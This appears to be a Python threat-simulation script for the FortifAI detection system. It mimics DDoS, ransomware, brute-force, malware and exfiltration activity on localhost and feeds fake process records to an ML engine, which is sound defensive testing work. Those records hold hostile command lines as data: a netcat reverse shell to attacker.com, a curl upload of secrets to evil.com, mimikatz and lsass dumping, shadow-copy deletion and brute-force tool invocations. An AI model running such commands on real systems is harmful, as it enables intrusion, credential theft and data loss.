#!/usr/bin/env python3
"""
FortifAI Threat Simulation Tool
================================
Safely simulates various attack patterns to test detection and alerting.
These simulations create HARMLESS processes that MIMIC threat behavior patterns.

Usage:
    python simulate_threats.py --attack ddos
    python simulate_threats.py --attack ransomware
    python simulate_threats.py --attack bruteforce
    python simulate_threats.py --attack all
    python simulate_threats.py --attack malware
"""

import os
import sys
import time
import json
import random
import string
import socket
import argparse
import threading
import subprocess
import tempfile
import requests
from datetime import datetime
from pathlib import Path

# API endpoints
API_BASE = os.getenv('API_URL', 'http://localhost:8000')
ML_ENGINE = os.getenv('ML_URL', 'http://localhost:5000')

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║  {Colors.BOLD}FortifAI Threat Simulation Tool{Colors.RED}                              ║
║  {Colors.YELLOW}⚠️  FOR TESTING PURPOSES ONLY - HARMLESS SIMULATIONS{Colors.RED}         ║
╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}
""")

def log(level, message):
    colors = {
        'INFO': Colors.BLUE,
        'WARN': Colors.YELLOW,
        'ERROR': Colors.RED,
        'SUCCESS': Colors.GREEN,
        'ATTACK': Colors.RED + Colors.BOLD
    }
    timestamp = datetime.now().strftime('%H:%M:%S')
    color = colors.get(level, Colors.RESET)
    print(f"[{timestamp}] {color}[{level}]{Colors.RESET} {message}")

def check_services():
    """Check if FortifAI services are running"""
    print(f"\n{Colors.CYAN}Checking FortifAI Services...{Colors.RESET}")
    
    services = {
        'API': f'{API_BASE}/health',
        'ML Engine': f'{ML_ENGINE}/health',
    }
    
    all_healthy = True
    for name, url in services.items():
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                log('SUCCESS', f'{name}: ✓ Running')
            else:
                log('ERROR', f'{name}: ✗ Unhealthy (status {r.status_code})')
                all_healthy = False
        except Exception as e:
            log('ERROR', f'{name}: ✗ Not reachable ({e})')
            all_healthy = False
    
    return all_healthy

def get_auth_token():
    """Get authentication token"""
    try:
        r = requests.post(f'{API_BASE}/auth/login', json={
            'username': 'admin',
            'password': 'admin123'
        }, timeout=5)
        if r.status_code == 200:
            return r.json().get('access_token')
    except:
        pass
    return None

def submit_to_scanner(process_data, token=None):
    """Submit simulated process to the scanner for analysis"""
    headers = {'Content-Type': 'application/json'}
    if token:
        headers['Authorization'] = f'Bearer {token}'
    
    try:
        # Extract processes and format for ML engine
        processes = process_data.get('processes', [])
        if not processes:
            return None
        
        # Use batch endpoint for multiple processes
        logs = []
        for proc in processes:
            # Format as log_data expected by ML engine
            log_entry = {
                'process_name': proc.get('name', ''),
                'cpu_usage': proc.get('cpu_percent', 0),
                'memory_usage': proc.get('memory_percent', 0),
                'num_threads': proc.get('num_threads', 1),
                'username': proc.get('username', 'SYSTEM'),
                'command_line': proc.get('cmdline', ''),
                'network_connections': proc.get('connections', 0),
                'timestamp': datetime.now().isoformat()
            }
            logs.append(log_entry)
        
        # Use batch analyze endpoint
        r = requests.post(f'{ML_ENGINE}/analyze/batch', 
                         json={'logs': logs}, 
                         headers=headers,
                         timeout=30)
        
        if r.status_code == 200:
            return r.json()
        else:
            log('ERROR', f'ML Engine returned status {r.status_code}: {r.text[:200]}')
            return None
            
    except Exception as e:
        log('ERROR', f'Failed to submit to scanner: {e}')
        return None

def check_alerts(token=None):
    """Check if alerts were generated"""
    headers = {}
    if token:
        headers['Authorization'] = f'Bearer {token}'
    
    try:
        r = requests.get(f'{API_BASE}/alerts?limit=5', headers=headers, timeout=5)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return []

# =============================================================================
# ATTACK SIMULATIONS
# =============================================================================

class DDoSSimulation:
    """
    Simulates DDoS attack patterns:
    - High connection count
    - Network flooding behavior
    - Multiple rapid requests
    """
    
    def __init__(self):
        self.name = "DDoS Attack"
        self.description = "Simulates distributed denial-of-service patterns"
    
    def generate_process_data(self):
        """Generate process data that looks like DDoS activity"""
        return {
            'processes': [
                {
                    'name': 'hping3.exe',  # Known DDoS tool
                    'pid': random.randint(5000, 9999),
                    'cpu_percent': random.uniform(60, 95),
                    'memory_percent': random.uniform(10, 30),
                    'num_threads': random.randint(100, 500),
                    'username': 'attacker',
                    'cmdline': 'hping3 -S --flood -p 80 target.com',
                    'connections': random.randint(1000, 5000),
                    'create_time': time.time() - random.randint(1, 60)
                },
                {
                    'name': 'loic.exe',  # Low Orbit Ion Cannon
                    'pid': random.randint(5000, 9999),
                    'cpu_percent': random.uniform(70, 99),
                    'memory_percent': random.uniform(20, 40),
                    'num_threads': random.randint(200, 1000),
                    'username': 'SYSTEM',
                    'cmdline': 'loic.exe -t 192.168.1.1 -m UDP',
                    'connections': random.randint(2000, 10000),
                    'create_time': time.time() - random.randint(1, 30)
                },
                {
                    'name': 'slowloris.py',
                    'pid': random.randint(5000, 9999),
                    'cpu_percent': random.uniform(30, 60),
                    'memory_percent': random.uniform(5, 15),
                    'num_threads': random.randint(500, 2000),
                    'username': 'attacker',
                    'cmdline': 'python slowloris.py -p 80 -s 1000',
                    'connections': random.randint(500, 2000),
                    'create_time': time.time() - random.randint(1, 120)
                }
            ]
        }
    
    def run(self, duration=30):
        """Run DDoS simulation"""
        log('ATTACK', f'🎯 Starting {self.name} simulation...')
        log('INFO', self.description)
        
        # Generate fake DDoS-like network activity
        connections = []
        
        print(f"\n{Colors.YELLOW}Simulating high connection rate...{Colors.RESET}")
        
        start_time = time.time()
        connection_count = 0
        
        while time.time() - start_time < duration:
            # Create many short-lived connections (harmless - to localhost)
            for _ in range(50):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    # Connect to our own API (harmless)
                    sock.connect(('127.0.0.1', 8000))
                    connections.append(sock)
                    connection_count += 1
                except:
                    pass
            
            # Close old connections
            while len(connections) > 100:
                try:
                    connections.pop(0).close()
                except:
                    pass
            
            elapsed = int(time.time() - start_time)
            print(f"\r  Connections created: {connection_count} | Elapsed: {elapsed}s / {duration}s", end='')
            time.sleep(0.5)
        
        # Cleanup
        for sock in connections:
            try:
                sock.close()
            except:
                pass
        
        print(f"\n{Colors.GREEN}✓ DDoS simulation complete - {connection_count} connections created{Colors.RESET}")
        
        return self.generate_process_data()


class RansomwareSimulation:
    """
    Simulates Ransomware behavior patterns:
    - File enumeration
    - Rapid file access
    - Encryption-like activity
    """
    
    def __init__(self):
        self.name = "Ransomware Attack"
        self.description = "Simulates ransomware file encryption patterns"
        self.temp_dir = None
    
    def generate_process_data(self):
        """Generate process data that looks like ransomware"""
        ransomware_names = [
            'cryptolocker.exe', 'wannacry.exe', 'locky.exe',
            'ryuk.exe', 'maze.exe', 'revil.exe', 'conti.exe'
        ]
        
        return {
            'processes': [
                {
                    'name': random.choice(ransomware_names),
                    'pid': random.randint(5000, 9999),
                    'cpu_percent': random.uniform(80, 99),
                    'memory_percent': random.uniform(30, 60),
                    'num_threads': random.randint(10, 50),
                    'username': 'SYSTEM',
                    'cmdline': f'{random.choice(ransomware_names)} --encrypt --recursive C:\\Users',
                    'connections': random.randint(1, 5),
                    'create_time': time.time() - random.randint(1, 300)
                },
                {
                    'name': 'vssadmin.exe',  # Often used to delete shadow copies
                    'pid': random.randint(5000, 9999),
                    'cpu_percent': random.uniform(10, 30),
                    'memory_percent': random.uniform(5, 15),
                    'num_threads': 2,
                    'username': 'SYSTEM',
                    'cmdline': 'vssadmin delete shadows /all /quiet',
                    'connections': 0,
                    'create_time': time.time() - random.randint(1, 60)
                },
                {
                    'name': 'cipher.exe',  # Windows encryption tool
                    'pid': random.randint(5000, 9999),
                    'cpu_percent': random.uniform(50, 80),
                    'memory_percent': random.uniform(10, 25),
                    'num_threads': 4,
                    'username': 'SYSTEM',
                    'cmdline': 'cipher /e /s:C:\\Users\\*',
                    'connections': 0,
                    'create_time': time.time() - random.randint(1, 120)
                }
            ]
        }
    
    def run(self, duration=20):
        """Run ransomware simulation - creates and 'encrypts' temp files"""
        log('ATTACK', f'🎯 Starting {self.name} simulation...')
        log('INFO', self.description)
        
        # Create temporary directory for simulation
        self.temp_dir = tempfile.mkdtemp(prefix='fortifai_ransom_test_')
        log('INFO', f'Created temp directory: {self.temp_dir}')
        
        print(f"\n{Colors.YELLOW}Simulating file encryption activity...{Colors.RESET}")
        
        files_created = 0
        files_encrypted = 0
        
        start_time = time.time()
        
        while time.time() - start_time < duration:
            # Create fake files
            for i in range(10):
                filename = f"document_{files_created}_{random.randint(1000,9999)}.txt"
                filepath = os.path.join(self.temp_dir, filename)
                
                # Create file with random content
                with open(filepath, 'w') as f:
                    f.write(''.join(random.choices(string.ascii_letters, k=1000)))
                files_created += 1
                
                # "Encrypt" it (just rename with .encrypted extension)
                encrypted_path = filepath + '.encrypted'
                os.rename(filepath, encrypted_path)
                files_encrypted += 1
                
                # Create ransom note
                if files_encrypted % 50 == 0:
                    note_path = os.path.join(self.temp_dir, f'README_DECRYPT_{files_encrypted}.txt')
                    with open(note_path, 'w') as f:
                        f.write("YOUR FILES HAVE BEEN ENCRYPTED!\n")
                        f.write("This is a SIMULATION for testing FortifAI detection.\n")
            
            elapsed = int(time.time() - start_time)
            print(f"\r  Files 'encrypted': {files_encrypted} | Elapsed: {elapsed}s / {duration}s", end='')
            time.sleep(0.3)
        
        print(f"\n{Colors.GREEN}✓ Ransomware simulation complete - {files_encrypted} files 'encrypted'{Colors.RESET}")
        
        # Cleanup
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
        log('INFO', 'Cleaned up temp files')
        
        return self.generate_process_data()


class BruteForceSimulation:
    """
    Simulates Brute Force attack patterns:
    - Multiple failed login attempts
    - Password spraying
    - Credential stuffing
    """
    
    def __init__(self):
        self.name = "Brute Force Attack"
        self.description = "Simulates credential brute force patterns"
    
    def generate_process_data(self):
        """Generate process data that looks like brute force tools"""
        return {
            'processes': [
                {
                    'name': 'hydra.exe',
                    'pid': random.randint(5000, 9999),
                    'cpu_percent': random.uniform(40, 70),
                    'memory_percent': random.uniform(10, 20),
                    'num_threads': random.randint(16, 64),
                    'username': 'attacker',
                    'cmdline': 'hydra -l admin -P passwords.txt ssh://target',
                    'connections': random.randint(10, 50),
                    'create_time': time.time() - random.randint(1, 300)
                },
                {
                    'name': 'medusa.exe',
                    'pid': random.randint(5000, 9999),
                    'cpu_percent': random.uniform(30, 60),
                    'memory_percent': random.uniform(5, 15),
                    'num_threads': random.randint(8, 32),
                    'username': 'attacker',
                    'cmdline': 'medusa -h target -u admin -P wordlist.txt -M ssh',
                    'connections': random.randint(5, 30),
                    'create_time': time.time() - random.randint(1, 180)
                },
                {
                    'name': 'crackmapexec.exe',
                    'pid': random.randint(5000, 9999),
                    'cpu_percent': random.uniform(20, 50),
                    'memory_percent': random.uniform(10, 25),
                    'num_threads': random.randint(4, 16),
                    'username': 'attacker',
                    'cmdline': 'crackmapexec smb 192.168.1.0/24 -u users.txt -p pass.txt',
                    'connections': random.randint(20, 100),
                    'create_time': time.time() - random.randint(1, 120)
                }
            ]
        }
    
    def run(self, duration=20):
        """Run brute force simulation - attempts failed logins"""
        log('ATTACK', f'🎯 Starting {self.name} simulation...')
        log('INFO', self.description)
        
        print(f"\n{Colors.YELLOW}Simulating failed login attempts...{Colors.RESET}")
        
        attempts = 0
        failed = 0
        
        # Common usernames and passwords for simulation
        usernames = ['admin', 'root', 'administrator', 'user', 'test', 'guest']
        passwords = ['password', '123456', 'admin', 'root', 'letmein', 'qwerty']
        
        start_time = time.time()
        
        while time.time() - start_time < duration:
            for username in usernames:
                for password in passwords:
                    attempts += 1
                    
                    try:
                        # Attempt login to our own API (harmless)
                        r = requests.post(f'{API_BASE}/auth/login', json={
                            'username': username,
                            'password': password
                        }, timeout=2)
                        
                        if r.status_code != 200:
                            failed += 1
                    except:
                        failed += 1
                    
                    elapsed = int(time.time() - start_time)
                    print(f"\r  Login attempts: {attempts} | Failed: {failed} | Elapsed: {elapsed}s / {duration}s", end='')
                    
                    if time.time() - start_time >= duration:
                        break
                    
                    time.sleep(0.1)  # Small delay between attempts
                
                if time.time() - start_time >= duration:
                    break
        
        print(f"\n{Colors.GREEN}✓ Brute force simulation complete - {attempts} attempts, {failed} failed{Colors.RESET}")
        
        return self.generate_process_data()


class MalwareSimulation:
    """
    Simulates generic malware behavior:
    - Suspicious process names
    - Unusual parent-child relationships
    - Known malware signatures
    """
    
    def __init__(self):
        self.name = "Malware Infection"
        self.description = "Simulates various malware behavior patterns"
    
    def generate_process_data(self):
        """Generate process data that looks like malware"""
        malware_samples = [
            {
                'name': 'emotet.exe',
                'cmdline': 'emotet.exe --spread --c2=evil.com:443',
                'category': 'trojan'
            },
            {
                'name': 'trickbot.exe',
                'cmdline': 'trickbot.exe -module pwgrab',
                'category': 'trojan'
            },
            {
                'name': 'mimikatz.exe',
                'cmdline': 'mimikatz.exe "sekurlsa::logonpasswords" exit',
                'category': 'credential_theft'
            },
            {
                'name': 'cobaltstrike.exe',
                'cmdline': 'beacon.exe --listener https://c2.evil.com',
                'category': 'rat'
            },
            {
                'name': 'nc.exe',  # Netcat - reverse shell
                'cmdline': 'nc.exe -e cmd.exe attacker.com 4444',
                'category': 'backdoor'
            },
            {
                'name': 'procdump.exe',
                'cmdline': 'procdump.exe -ma lsass.exe lsass.dmp',
                'category': 'credential_theft'
            }
        ]
        
        processes = []
        for sample in random.sample(malware_samples, min(3, len(malware_samples))):
            processes.append({
                'name': sample['name'],
                'pid': random.randint(5000, 9999),
                'cpu_percent': random.uniform(20, 80),
                'memory_percent': random.uniform(10, 40),
                'num_threads': random.randint(5, 30),
                'username': 'SYSTEM',
                'cmdline': sample['cmdline'],
                'connections': random.randint(1, 20),
                'create_time': time.time() - random.randint(1, 600)
            })
        
        return {'processes': processes}
    
    def run(self, duration=15):
        """Run malware simulation"""
        log('ATTACK', f'🎯 Starting {self.name} simulation...')
        log('INFO', self.description)
        
        print(f"\n{Colors.YELLOW}Simulating malware activity patterns...{Colors.RESET}")
        
        # Create suspicious-looking temp files
        temp_dir = tempfile.mkdtemp(prefix='fortifai_malware_test_')
        
        suspicious_files = [
            'payload.exe', 'dropper.dll', 'keylogger.dat',
            'c2_config.json', 'stolen_creds.txt', 'exfil_data.zip'
        ]
        
        for filename in suspicious_files:
            filepath = os.path.join(temp_dir, filename)
            with open(filepath, 'wb') as f:
                # Write random bytes to simulate binary
                f.write(os.urandom(1024))
            log('INFO', f'Created suspicious file: {filename}')
            time.sleep(0.5)
        
        print(f"\n{Colors.GREEN}✓ Malware simulation complete{Colors.RESET}")
        
        # Cleanup
        import shutil
        shutil.rmtree(temp_dir, ignore_errors=True)
        log('INFO', 'Cleaned up suspicious files')
        
        return self.generate_process_data()


class DataExfiltrationSimulation:
    """
    Simulates Data Exfiltration patterns:
    - Large data transfers
    - Unusual outbound connections
    - Data encoding/compression
    """
    
    def __init__(self):
        self.name = "Data Exfiltration"
        self.description = "Simulates data theft and exfiltration patterns"
    
    def generate_process_data(self):
        """Generate process data that looks like data exfiltration"""
        return {
            'processes': [
                {
                    'name': 'rclone.exe',
                    'pid': random.randint(5000, 9999),
                    'cpu_percent': random.uniform(30, 60),
                    'memory_percent': random.uniform(20, 40),
                    'num_threads': random.randint(4, 16),
                    'username': 'attacker',
                    'cmdline': 'rclone copy C:\\Users\\Documents remote:exfil',
                    'connections': random.randint(5, 20),
                    'create_time': time.time() - random.randint(1, 300)
                },
                {
                    'name': 'curl.exe',
                    'pid': random.randint(5000, 9999),
                    'cpu_percent': random.uniform(10, 30),
                    'memory_percent': random.uniform(5, 15),
                    'num_threads': 2,
                    'username': 'SYSTEM',
                    'cmdline': 'curl -X POST -d @secrets.zip https://evil.com/upload',
                    'connections': 1,
                    'create_time': time.time() - random.randint(1, 60)
                },
                {
                    'name': '7z.exe',
                    'pid': random.randint(5000, 9999),
                    'cpu_percent': random.uniform(60, 90),
                    'memory_percent': random.uniform(30, 50),
                    'num_threads': 8,
                    'username': 'SYSTEM',
                    'cmdline': '7z a -p"secret" exfil.7z C:\\ConfidentialData\\*',
                    'connections': 0,
                    'create_time': time.time() - random.randint(1, 120)
                }
            ]
        }
    
    def run(self, duration=15):
        """Run data exfiltration simulation"""
        log('ATTACK', f'🎯 Starting {self.name} simulation...')
        log('INFO', self.description)
        
        print(f"\n{Colors.YELLOW}Simulating data exfiltration...{Colors.RESET}")
        
        # Simulate large data transfer to localhost (harmless)
        data_sent = 0
        
        start_time = time.time()
        while time.time() - start_time < duration:
            try:
                # Send data to our own API (harmless)
                fake_data = ''.join(random.choices(string.ascii_letters, k=10000))
                r = requests.post(f'{API_BASE}/health', data=fake_data, timeout=2)
                data_sent += len(fake_data)
            except:
                pass
            
            elapsed = int(time.time() - start_time)
            print(f"\r  Data 'exfiltrated': {data_sent/1024:.1f} KB | Elapsed: {elapsed}s / {duration}s", end='')
            time.sleep(0.2)
        
        print(f"\n{Colors.GREEN}✓ Data exfiltration simulation complete - {data_sent/1024:.1f} KB transferred{Colors.RESET}")
        
        return self.generate_process_data()


# =============================================================================
# MAIN EXECUTION
# =============================================================================

def analyze_and_report(process_data, attack_name, token=None):
    """Submit data to ML engine and check for detection"""
    print(f"\n{Colors.CYAN}═══════════════════════════════════════════════════════════════{Colors.RESET}")
    print(f"{Colors.BOLD}Submitting {attack_name} patterns to ML Engine for analysis...{Colors.RESET}")
    print(f"{Colors.CYAN}═══════════════════════════════════════════════════════════════{Colors.RESET}\n")
    
    detected_threats = []
    processes = process_data.get('processes', [])
    
    # Submit all processes at once using batch endpoint
    log('INFO', f"Analyzing {len(processes)} processes...")
    for proc in processes:
        log('INFO', f"  - {proc['name']}")
    
    result = submit_to_scanner(process_data, token)
    
    if result:
        threats = result.get('threats', [])
        total_analyzed = result.get('total_analyzed', 0)
        threat_count = result.get('threat_count', 0)
        
        log('INFO', f"ML Engine analyzed {total_analyzed} processes")
        
        if threats:
            for threat in threats:
                log_index = threat.get('log_index', 0)
                proc_name = processes[log_index]['name'] if log_index < len(processes) else 'unknown'
                
                detected_threats.append({
                    'process': proc_name,
                    'classification': threat.get('classification', 'unknown'),
                    'threat_type': threat.get('threat_type', 'unknown'),
                    'confidence': threat.get('confidence', 0),
                    'risk_score': threat.get('risk_score', 0),
                    'anomaly_score': threat.get('anomaly_score', 0),
                    'is_anomaly': threat.get('anomaly_score', 0) < -0.5,
                    'recommendations': threat.get('recommendations', [])
                })
                
                conf = threat.get('confidence', 0)
                classification = threat.get('classification', 'unknown')
                log('SUCCESS', f"  ✓ DETECTED: {proc_name}")
                log('SUCCESS', f"    Classification: {classification}")
                log('SUCCESS', f"    Confidence: {conf:.1%}")
                log('SUCCESS', f"    Risk Score: {threat.get('risk_score', 0):.2f}")
        else:
            log('WARN', f"No threats detected in {total_analyzed} processes")
    else:
        log('ERROR', f"Failed to analyze processes")
    
    return detected_threats


def print_summary(attack_name, detected_threats, simulation_type):
    """Print detection summary"""
    print(f"\n{Colors.CYAN}═══════════════════════════════════════════════════════════════{Colors.RESET}")
    print(f"{Colors.BOLD}DETECTION SUMMARY - {attack_name}{Colors.RESET}")
    print(f"{Colors.CYAN}═══════════════════════════════════════════════════════════════{Colors.RESET}\n")
    
    if detected_threats:
        print(f"{Colors.GREEN}✓ {len(detected_threats)} threat(s) detected!{Colors.RESET}\n")
        
        for threat in detected_threats:
            print(f"  • {Colors.RED}{threat['process']}{Colors.RESET}")
            print(f"    Classification: {threat['classification']}")
            print(f"    Confidence: {threat['confidence']:.1%}")
            print(f"    Anomaly: {'Yes' if threat['is_anomaly'] else 'No'}")
            print()
    else:
        print(f"{Colors.YELLOW}⚠ No threats detected - the system may need tuning{Colors.RESET}")
        print(f"\nPossible reasons:")
        print(f"  1. The ML model needs more training data for {simulation_type}")
        print(f"  2. The threat patterns don't match the model's signatures")
        print(f"  3. The anomaly detection threshold is too high")
    
    print(f"\n{Colors.CYAN}═══════════════════════════════════════════════════════════════{Colors.RESET}")


def run_all_simulations(token):
    """Run all attack simulations"""
    simulations = [
        ('DDoS', DDoSSimulation(), 15),
        ('Ransomware', RansomwareSimulation(), 15),
        ('Brute Force', BruteForceSimulation(), 15),
        ('Malware', MalwareSimulation(), 10),
        ('Data Exfiltration', DataExfiltrationSimulation(), 10),
    ]
    
    all_results = {}
    
    for name, sim, duration in simulations:
        print(f"\n{'='*65}")
        print(f"{Colors.BOLD}SIMULATION: {name.upper()}{Colors.RESET}")
        print(f"{'='*65}")
        
        process_data = sim.run(duration)
        detected = analyze_and_report(process_data, name, token)
        all_results[name] = {
            'detected': len(detected),
            'threats': detected
        }
        
        time.sleep(2)
    
    # Final summary
    print(f"\n\n{'='*65}")
    print(f"{Colors.BOLD}{Colors.CYAN}FINAL SUMMARY - ALL SIMULATIONS{Colors.RESET}")
    print(f"{'='*65}\n")
    
    total_detected = 0
    for name, results in all_results.items():
        status = f"{Colors.GREEN}✓{Colors.RESET}" if results['detected'] > 0 else f"{Colors.RED}✗{Colors.RESET}"
        print(f"  {status} {name}: {results['detected']} threats detected")
        total_detected += results['detected']
    
    print(f"\n  Total threats detected: {total_detected}")
    print(f"{'='*65}\n")


def main():
    parser = argparse.ArgumentParser(description='FortifAI Threat Simulation Tool')
    parser.add_argument('--attack', '-a', 
                       choices=['ddos', 'ransomware', 'bruteforce', 'malware', 'exfiltration', 'all'],
                       default='all',
                       help='Type of attack to simulate')
    parser.add_argument('--duration', '-d', type=int, default=20,
                       help='Duration of simulation in seconds')
    parser.add_argument('--skip-check', action='store_true',
                       help='Skip service health check')
    
    args = parser.parse_args()
    
    print_banner()
    
    # Check services
    if not args.skip_check:
        if not check_services():
            log('ERROR', 'Some services are not running. Start them first or use --skip-check')
            print(f"\n{Colors.YELLOW}To start services:{Colors.RESET}")
            print(f"  cd infrastructure/docker && docker-compose up -d")
            sys.exit(1)
    
    # Get auth token
    token = get_auth_token()
    if token:
        log('SUCCESS', 'Authenticated successfully')
    else:
        log('WARN', 'Could not authenticate - some features may not work')
    
    # Run simulation
    simulations = {
        'ddos': (DDoSSimulation(), 'DDoS Attack'),
        'ransomware': (RansomwareSimulation(), 'Ransomware Attack'),
        'bruteforce': (BruteForceSimulation(), 'Brute Force Attack'),
        'malware': (MalwareSimulation(), 'Malware Infection'),
        'exfiltration': (DataExfiltrationSimulation(), 'Data Exfiltration'),
    }
    
    if args.attack == 'all':
        run_all_simulations(token)
    else:
        sim, name = simulations[args.attack]
        process_data = sim.run(args.duration)
        detected = analyze_and_report(process_data, name, token)
        print_summary(name, detected, args.attack)
    
    print(f"\n{Colors.GREEN}Simulation complete!{Colors.RESET}")
    print(f"\nTo check generated alerts:")
    print(f"  curl http://localhost:8000/alerts")
    print(f"\nTo view in dashboard:")
    print(f"  http://localhost:3000/alerts")


if __name__ == '__main__':
    main()
